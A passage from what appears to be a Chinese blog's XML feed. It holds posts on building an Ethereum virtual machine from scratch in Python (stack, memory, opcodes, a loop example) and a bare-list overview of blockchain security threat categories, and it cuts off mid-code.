loops, loop_body</span><br>        JUMPI,      <span class="hljs-comment"># n, loops, result</span><br><br>        <span class="hljs-comment"># return result</span><br>        PUSH1, <span class="hljs-number">0</span>,   <span class="hljs-comment"># n, loops, result, m_result</span><br>        MSTORE8,    <span class="hljs-comment"># n, loops</span><br>        PUSH1, <span class="hljs-number">1</span>,   <span class="hljs-comment"># n, loops, mem_length</span><br>        PUSH1, <span class="hljs-number">0</span>,   <span class="hljs-comment"># n, loops, mem_length, mem_offset</span><br>        RETURN,<br><br>        <span class="hljs-comment"># loop_body</span><br>        JUMPDEST,<br><br>        <span class="hljs-comment"># result += n</span><br>        DUP3,       <span class="hljs-comment"># n, loops, result, n</span><br>        ADD,        <span class="hljs-comment"># n, loops, result&#x27;=n+result</span><br><br>        <span class="hljs-comment"># loops -= 1</span><br>        SWAP1,      <span class="hljs-comment"># n, result&#x27;, loops</span><br>        PUSH1, <span class="hljs-number">1</span>,   <span class="hljs-comment"># n, result&#x27;, loops, 1</span><br>        SWAP1,      <span class="hljs-comment"># n, result&#x27;, 1, loops</span><br>        SUB,        <span class="hljs-comment"># n, result&#x27;, loops&#x27;=loops-1</span><br><br>        <span class="hljs-comment"># restore stack</span><br>        SWAP1,      <span class="hljs-comment"># n, loops&#x27;, result&#x27;</span><br><br>        <span class="hljs-comment"># jump to loop_cond</span><br>        PUSH1, <span class="hljs-number">5</span>,   <span class="hljs-comment"># n, loops&#x27;, result&#x27;, loop_cond</span><br>        JUMP,       <span class="hljs-comment"># -&gt; back to loop_cond</span><br>    ])<br><br>    ret = run(code, verbose=<span class="hljs-literal">True</span>, max_steps=<span class="hljs-number">200</span>)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>.from_bytes(ret, <span class="hljs-string">&#x27;big&#x27;</span>) == <span class="hljs-number">4</span> * <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>📕值得注意的几点：</p><ol><li>现在我们有了一组可行的堆栈指令，我们可以将变量留在堆栈上，并使用复制&#x2F;交换指令（DUP&#x2F;SWAP）对它们进行操作。我们访问内存的唯一时间是存储返回数据。</li><li>我们没有标签，所以我们必须计算并手动硬编码跳转偏移量（例如，最后的PUSH15，jump返回loop_cond块）</li><li>当我们想推送一个值时，我们必须根据参数（PUSH1、PUSH2、…PUSH32）的字节</li></ol><p>实际上：我们到到目前位置所构建的（仅在字节数组级别之上的原始指令上的薄包装器）与Yul进行比较时，仍会感觉到Yul是一种相当高级的语言，以Yul文档中的这段摘录为例：</p><blockquote><p>没有为<code>SWAP</code>、<code>DUP</code>、<code>JUMPDEST</code>、<code>JUMP</code>、<code>JUMPI</code>提供显式语句，因为前两个使数据流模糊，后两个使控制流模糊。</p></blockquote><h2 id="🥉接下来的内容"><a href="#🥉接下来的内容" class="headerlink" title="🥉接下来的内容"></a>🥉接下来的内容</h2><p>我们已经开始感到我们需要某些东西比如<code>calldata</code>来为我们的小项目建模输入。</p><p>同样我们也没有建立预想中的返回。在那之后我们很有可能做一些非凡的事情比如内部交易或者是合约创建。我们第三部分见吧！</p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>Python</category>
      
      <category>以太坊虚拟机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EVM虚拟机 源码构建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链安全威胁汇总</title>
    <link href="/2022/11/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/"/>
    <url>/2022/11/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>目前来看，区块链安全威胁总分为五类。</p><p>自上而下分为：数据层、网络层、共识层、合约层以及应用层。</p><p>本篇文章为概览，并不详细展开讲解~</p></blockquote><h2 id="💎数据层"><a href="#💎数据层" class="headerlink" title="💎数据层"></a>💎数据层</h2><blockquote><p>数据层、网络层和共识层是区块链技术体系中<mark>最基础最必要</mark>的三个层级。</p><p>而数据层是其中最重要的一层，主要涉及区块链的数据结构、数字签名、哈希函数等密码学工具。</p><p>区块链数据层主要面临的安全威胁主要包含：数据隐私窃取和恶意数据。</p></blockquote><h3 id="🈲数据隐私窃取"><a href="#🈲数据隐私窃取" class="headerlink" title="🈲数据隐私窃取"></a>🈲数据隐私窃取</h3><ul><li><p>碰撞</p></li><li><p>后门</p></li><li><p>量子</p></li><li><p>交易特征分析</p></li></ul><h3 id="🈲恶意数据"><a href="#🈲恶意数据" class="headerlink" title="🈲恶意数据"></a>🈲恶意数据</h3><ul><li><p>交易延展性</p></li><li><p>恶意信息</p></li></ul><h2 id="💎网络层"><a href="#💎网络层" class="headerlink" title="💎网络层"></a>💎网络层</h2><blockquote><p>网络层是区块链技术体系中最基础的层级，主要包含P2P网络组网方式、消息传播协议等元素，赋予了区块链去中心化、不可删除、不可篡改的技术特性。</p><p>区块链网络层面临的安全威胁主要是针对P2P网络的恶意。</p></blockquote><h3 id="🕸针对P2P网络"><a href="#🕸针对P2P网络" class="headerlink" title="🕸针对P2P网络"></a>🕸针对P2P网络</h3><ul><li><p>客户端漏洞</p></li><li><p>窃听</p></li><li><p>日蚀</p></li><li><p>BGP劫持</p></li><li><p>分割</p></li><li><p>DoS攻击</p></li><li><p>DDoS攻击</p></li><li><p>BDoS攻击</p></li><li><p>交易延迟</p></li></ul><h2 id="💎共识层"><a href="#💎共识层" class="headerlink" title="💎共识层"></a>💎共识层</h2><blockquote><p>共识层是区块链技术体系的核心架构，其中的共识算法可以保证全网节点在去信任化的场景中对分布式账本数据达成共识，为区块链的去中心化、去信任化提供保障。</p><p>共识层面临的安全威胁主要是者可以通过各种手段阻止全网节点达成正确的共识。</p></blockquote><h3 id="🗡针对授权共识机制"><a href="#🗡针对授权共识机制" class="headerlink" title="🗡针对授权共识机制"></a>🗡针对授权共识机制</h3><ul><li><p>女巫</p></li><li><p>克隆</p></li></ul><h3 id="🗡针对非授权共识机制"><a href="#🗡针对非授权共识机制" class="headerlink" title="🗡针对非授权共识机制"></a>🗡针对非授权共识机制</h3><h4 id="恶意筹码获取"><a href="#恶意筹码获取" class="headerlink" title="恶意筹码获取"></a>恶意筹码获取</h4><ul><li><p>傀儡挖矿</p></li><li><p>币龄累计</p></li><li><p>贿赂</p></li></ul><h4 id="51"><a href="#51" class="headerlink" title="51%"></a>51%</h4><ul><li><p>双花</p></li><li><p>历史修复</p></li><li><p>卖空</p></li><li><p>自私挖矿</p></li></ul><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul><li><p>无利害关系</p></li><li><p>预计算</p></li><li><p>长距离</p></li></ul><h2 id="💎合约层"><a href="#💎合约层" class="headerlink" title="💎合约层"></a>💎合约层</h2><blockquote><p>合约层是区块链实现点对点可信交互的重要保障，是区块链2.0的重要标志；</p><p>合约层面临的主要安全威胁：智能合约漏洞和合约虚拟机漏洞。</p></blockquote><h3 id="🍁针对智能合约"><a href="#🍁针对智能合约" class="headerlink" title="🍁针对智能合约"></a>🍁针对智能合约</h3><ul><li><p>整数溢出漏洞</p></li><li><p>时间戳依赖</p></li><li><p>调用深度</p></li><li><p>误操作异常</p></li><li><p>重入</p></li></ul><h3 id="🍁针对合约虚拟机"><a href="#🍁针对合约虚拟机" class="headerlink" title="🍁针对合约虚拟机"></a>🍁针对合约虚拟机</h3><ul><li><p>逃逸漏洞</p></li><li><p>逻辑漏洞</p></li><li><p>资源滥用漏洞</p></li></ul><h2 id="💎应用层"><a href="#💎应用层" class="headerlink" title="💎应用层"></a>💎应用层</h2><blockquote><p>应用层是区块链技术的应用载体，为各种业务场景提供了解决方案，可分为挖矿和区块链交易两类场景。</p><p>应用层面临的主要安全威胁：挖矿场景以及交易场景。</p></blockquote><h3 id="挖矿场景中"><a href="#挖矿场景中" class="headerlink" title="挖矿场景中"></a>挖矿场景中</h3><h4 id="⛏针对矿机"><a href="#⛏针对矿机" class="headerlink" title="⛏针对矿机"></a>⛏针对矿机</h4><ul><li><p>0day漏洞</p></li><li><p>网络渗透</p></li><li><p>地址篡改</p></li></ul><h4 id="⛏针对挖矿机制"><a href="#⛏针对挖矿机制" class="headerlink" title="⛏针对挖矿机制"></a>⛏针对挖矿机制</h4><ul><li><p>算力伪造</p></li><li><p>扣块</p></li><li><p>丢弃</p></li><li><p>空块</p></li><li><p>通用挖矿</p></li><li><p>交易顺序依赖</p></li><li><p>芬尼</p></li><li><p>种族</p></li></ul><h3 id="区块链交易场景中"><a href="#区块链交易场景中" class="headerlink" title="区块链交易场景中"></a>区块链交易场景中</h3><h4 id="🎣针对交易平台"><a href="#🎣针对交易平台" class="headerlink" title="🎣针对交易平台"></a>🎣针对交易平台</h4><ul><li><p>弱口令</p></li><li><p>撞库</p></li><li><p>穷举</p></li><li><p>单点登录漏洞</p></li><li><p>API接口</p></li></ul><h4 id="🎣针对用户账户"><a href="#🎣针对用户账户" class="headerlink" title="🎣针对用户账户"></a>🎣针对用户账户</h4><ul><li><p>钓鱼</p></li><li><p>中间人劫持</p></li><li><p>木马劫持</p></li><li><p>私钥盗取</p></li><li><p>钱包客户端漏洞</p></li><li><p>粉尘</p></li><li><p>SIM盗用</p></li><li><p>在线钱包盗取</p></li><li><p>重放</p></li></ul><h3 id="📕参考资料"><a href="#📕参考资料" class="headerlink" title="📕参考资料"></a>📕参考资料</h3><p>书籍-《区块链安全技术》王剑锋 陈晓峰 王连海 著</p>]]></content>
    
    
    <categories>
      
      <category>区块链 合约安全审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>区块链 总览</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>狠人！用Python从零敲出一个以太坊虚拟机-1</title>
    <link href="/2022/11/08/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-1/"/>
    <url>/2022/11/08/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-1/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="📕介绍"><a href="#📕介绍" class="headerlink" title="📕介绍"></a>📕介绍</h2><p>阅读完Cupid的 <a href="https://femboy.capital/evm-pt1">Playdate with the EVM</a> 这篇文章后，我非常享受，但想要更多地去实践操作。 因此让我们尝试从头开始去构建一个以太坊虚拟机(EVM)！只参考以太坊黄皮书（<a href="https://github.com/ethereum/yellowpaper">yellow paper </a>）</p><p>在第一部分，我们将去构建:</p><ul><li>一个基本的堆栈(stack)</li><li>一个基本的临时存储器(memory)</li><li>代码缓冲区</li><li>一些指令</li><li>一个指令编译器</li><li>一个基础的提取解码循环</li></ul><h2 id="🌽堆栈和存储器"><a href="#🌽堆栈和存储器" class="headerlink" title="🌽堆栈和存储器"></a>🌽堆栈和存储器</h2><blockquote><p>Most of the things we need to get started can be found in Section 9, The Execution Model.</p><p>在以太坊黄皮书的第九部分提到了 <mark>执行模型</mark></p></blockquote><p><img src="/2022/11/08/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-1/1.png"></p><p>首先，我们得有一个256位字并且最大容量为1024的堆栈，就像这样：</p><p><code>stack.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 栈类的深度限制为1024个元素</span><br><span class="hljs-keyword">from</span> .constants <span class="hljs-keyword">import</span> MAX_STACK_DEPTH, MAX_UINT256<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Stack</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_depth=MAX_STACK_DEPTH</span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.stack = []<br>        self.max_depth = max_depth<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">self, item: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> item &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> item &gt; MAX_UINT256:<br>            <span class="hljs-keyword">raise</span> InvalidStackItem(&#123;<span class="hljs-string">&quot;item&quot;</span>: item&#125;)<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(self.stack) + <span class="hljs-number">1</span>) &gt; self.max_depth:<br>            <span class="hljs-keyword">raise</span> StackOverflow()<br><br>        self.stack.append(item)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.stack) == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> StackUnderflow()<br><br>        <span class="hljs-keyword">return</span> self.stack.pop()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(self.stack)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(self)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">StackUnderflow</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    ...<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">StackOverflow</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    ...<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">InvalidStackItem</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    ...<br><br></code></pre></td></tr></table></figure><p>其中<code>constants.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">MAX_UINT256 = <span class="hljs-number">2</span> ** <span class="hljs-number">256</span> - <span class="hljs-number">1</span><br>MAX_UINT8 = <span class="hljs-number">2</span> ** <span class="hljs-number">8</span> - <span class="hljs-number">1</span><br>MAX_STACK_DEPTH = <span class="hljs-number">1024</span><br></code></pre></td></tr></table></figure><p>接着我们得有一个临时存储器（memory）</p><p>这是现在我所能想到的最简单的例子：<code>memory.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> .constants <span class="hljs-keyword">import</span> MAX_UINT256, MAX_UINT8<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Memory</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> use https://docs.python.org/3/library/functions.html#func-bytearray</span><br>        self.memory = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>(<span class="hljs-params">self, offset: <span class="hljs-built_in">int</span>, value: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> offset &gt; MAX_UINT256:<br>            <span class="hljs-keyword">raise</span> InvalidMemoryAccess(&#123;<span class="hljs-string">&quot;offset&quot;</span>: offset, <span class="hljs-string">&quot;value&quot;</span>: value&#125;)<br><br>        <span class="hljs-keyword">if</span> value &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> value &gt; MAX_UINT8:<br>            <span class="hljs-keyword">raise</span> InvalidMemoryValue(&#123;<span class="hljs-string">&quot;offset&quot;</span>: offset, <span class="hljs-string">&quot;value&quot;</span>: value&#125;)<br><br>        <span class="hljs-comment"># 在必要时将会拓展 memory存储数组长度</span><br>        <span class="hljs-keyword">if</span> offset &gt;= <span class="hljs-built_in">len</span>(self.memory):<br>            self.memory.extend([<span class="hljs-number">0</span>] * (offset - <span class="hljs-built_in">len</span>(self.memory) + <span class="hljs-number">1</span>))<br><br>        self.memory[offset] = value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">self, offset: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> InvalidMemoryAccess(&#123;<span class="hljs-string">&quot;offset&quot;</span>: offset&#125;)<br><br>        <span class="hljs-keyword">if</span> offset &gt;= <span class="hljs-built_in">len</span>(self.memory):<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">return</span> self.memory[offset]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">InvalidMemoryAccess</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    ...<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">InvalidMemoryValue</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    ...<br></code></pre></td></tr></table></figure><p>让我们先暂时忽略storage存储，先开始第二部分。</p><hr><h2 id="🌽定义指令"><a href="#🌽定义指令" class="headerlink" title="🌽定义指令"></a>🌽定义指令</h2><p><img src="/2022/11/08/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-1/2.png"></p><p>以太坊虚拟机的合约代码不是于数据一起驻留在内存中的，而是另辟一个单独的空间存储。我们将其定义为一个简单的字节对象，可以得到如下<code>ExecutionContext</code>结构：</p><p><code>context.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> .memory <span class="hljs-keyword">import</span> Memory<br><span class="hljs-keyword">from</span> .stack <span class="hljs-keyword">import</span> Stack<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">EVM中的合约代码不是与数据一起驻留在内存中，而是驻留在一个单独的区域中。</span><br><span class="hljs-string">如果我们将其定义为一个简单的字节对象，我们将得到以下ExecutionContext结构</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecutionContext</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, code=<span class="hljs-built_in">bytes</span>(<span class="hljs-params"></span>), pc=<span class="hljs-number">0</span>, stack=Stack(<span class="hljs-params"></span>), memory=Memory(<span class="hljs-params"></span>)</span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.code = code<br>        self.stack = stack<br>        self.memory = memory<br>        self.pc = pc<br>        self.stopped = <span class="hljs-literal">False</span><br>        self.returndata = <span class="hljs-built_in">bytes</span>()<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.stopped = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_code</span>(<span class="hljs-params">self, num_bytes</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        :param num_bytes:</span><br><span class="hljs-string">        :return:Returns the next num_bytes from the code buffer (at index pc) as an integer and advances pc by num_bytes.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        value = <span class="hljs-built_in">int</span>.from_bytes(<br>            self.code[self.pc:self.pc + num_bytes], byteorder=<span class="hljs-string">&quot;big&quot;</span><br>        )<br>        self.pc += num_bytes<br>        <span class="hljs-keyword">return</span> value<br><br></code></pre></td></tr></table></figure><hr><p>有了代码临时存放的地方，开始定义指令类</p><p><code>opcodes.py/Instruction</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Instruction</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, opcode: <span class="hljs-built_in">int</span>, name: <span class="hljs-built_in">str</span>, arg_length=<span class="hljs-number">0</span></span>):<br>        self.opcode = opcode<br>        self.name = name<br>        self.arg_length = arg_length<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">self, context: ExecutionContext</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">raise</span> NotImplementedError<br></code></pre></td></tr></table></figure><p>以及它的辅助函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">INSTRUCTIONS = []<br>INSTRUCTIONS_BY_OPCODE = &#123;&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register_instruction</span>(<span class="hljs-params">opcode: <span class="hljs-built_in">int</span>, name: <span class="hljs-built_in">str</span>, execute_func: <span class="hljs-built_in">callable</span></span>):<br>    instruction = Instruction(opcode, name)<br>    instruction.execute = execute_func<br>    INSTRUCTIONS.append(instruction)<br><br>    <span class="hljs-keyword">assert</span> opcode <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> INSTRUCTIONS_BY_OPCODE<br>    INSTRUCTIONS_BY_OPCODE[opcode] = instruction<br><br>    <span class="hljs-keyword">return</span> instruction<br></code></pre></td></tr></table></figure><p>现在我们可以定义一些简单的指令就像下面给出的那样:</p><p><code>ExecutionContext</code>存放</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义命令</span><br>STOP = register_instruction(<span class="hljs-number">0x00</span>, <span class="hljs-string">&quot;STOP&quot;</span>, (<span class="hljs-keyword">lambda</span> ctx: ctx.stop()))<br><span class="hljs-comment"># 放入堆栈指令</span><br>PUSH1 = register_instruction(<br>    <span class="hljs-number">0x60</span>,<br>    <span class="hljs-string">&quot;PUSH1&quot;</span>,<br>    (<span class="hljs-keyword">lambda</span> ctx: ctx.stack.push(ctx.read_code(<span class="hljs-number">1</span>)))<br>)<br><span class="hljs-comment"># 加法指令</span><br>ADD = register_instruction(<br>    <span class="hljs-number">0x01</span>,<br>    <span class="hljs-string">&quot;ADD&quot;</span>,<br>    (<span class="hljs-keyword">lambda</span> ctx: ctx.stack.push((ctx.stack.pop() + ctx.stack.pop()) % <span class="hljs-number">2</span> ** <span class="hljs-number">256</span>)),<br>)<br><span class="hljs-comment"># 乘法指令</span><br>MUL = register_instruction(<br>    <span class="hljs-number">0x02</span>,<br>    <span class="hljs-string">&quot;MUL&quot;</span>,<br>    (<span class="hljs-keyword">lambda</span> ctx: ctx.stack.push((ctx.stack.pop() * ctx.stack.pop()) % <span class="hljs-number">2</span> ** <span class="hljs-number">256</span>)),<br>)<br><br><br></code></pre></td></tr></table></figure><h2 id="🌽运行代码"><a href="#🌽运行代码" class="headerlink" title="🌽运行代码"></a>🌽运行代码</h2><blockquote><p>现在，为了运行代码，我们只需要知道如何解码代码中的指令</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_opcode</span>(<span class="hljs-params">context: ExecutionContext</span>) -&gt; Instruction:<br>    <span class="hljs-keyword">if</span> context.pc &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> context.pc &gt;= <span class="hljs-built_in">len</span>(context.code):<br>        <span class="hljs-keyword">raise</span> InvalidCodeOffset(&#123;<span class="hljs-string">&quot;code&quot;</span>: context.code, <span class="hljs-string">&quot;pc&quot;</span>: context.pc&#125;)<br><br>    opcode = context.read_code(<span class="hljs-number">1</span>)<br>    instruction = INSTRUCTIONS_BY_OPCODE.get(opcode)<br>    <span class="hljs-keyword">if</span> instruction <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">raise</span> UnknownOpcode(&#123;<span class="hljs-string">&quot;opcode&quot;</span>: opcode&#125;)<br><br>    <span class="hljs-keyword">return</span> instruction<br></code></pre></td></tr></table></figure><p>并且现在如果我们忽略gas费的消耗，将能够得到最终运行脚本：</p><p><code>runner.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> .context <span class="hljs-keyword">import</span> ExecutionContext<br><span class="hljs-keyword">from</span> .opcodes <span class="hljs-keyword">import</span> decode_opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">code: <span class="hljs-built_in">bytes</span></span>)-&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    :param code:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    context = ExecutionContext(code = code)<br><br>  